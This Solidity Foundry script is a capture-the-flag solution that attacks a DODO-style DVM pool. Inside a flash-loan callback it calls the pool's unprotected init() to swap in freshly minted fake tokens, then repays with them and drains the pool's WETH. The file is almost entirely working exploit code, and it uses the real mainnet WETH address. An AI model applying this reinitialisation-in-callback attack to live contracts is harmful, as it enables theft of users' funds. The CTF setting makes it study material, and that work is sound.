// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-ctf/CTFSolver.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/Challenge.sol";

contract FakeToken is ERC20 {
    constructor() ERC20("Fake Token", "FT") {
        _mint(msg.sender, 10_000_000 ether);
    }
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function buyShares(address) external;
}

contract Exploit {
    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        console.log("solved?", CHALLENGE.isSolved());

        DVMLike(CHALLENGE.dvm()).flashLoan(WETH.balanceOf(address(CHALLENGE.dvm())), 0, address(this), hex"00");

        console.log("solved?", CHALLENGE.isSolved());
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        FakeToken baseToken = new FakeToken();
        FakeToken quoteToken = new FakeToken();

        DVMLike(CHALLENGE.dvm()).init(
            address(this),
            address(baseToken),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        baseToken.transfer(CHALLENGE.dvm(), 10_000_000 ether);
        quoteToken.transfer(CHALLENGE.dvm(), 10_000_000 ether);
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        new Exploit(Challenge(challenge)).exploit();
    }
}
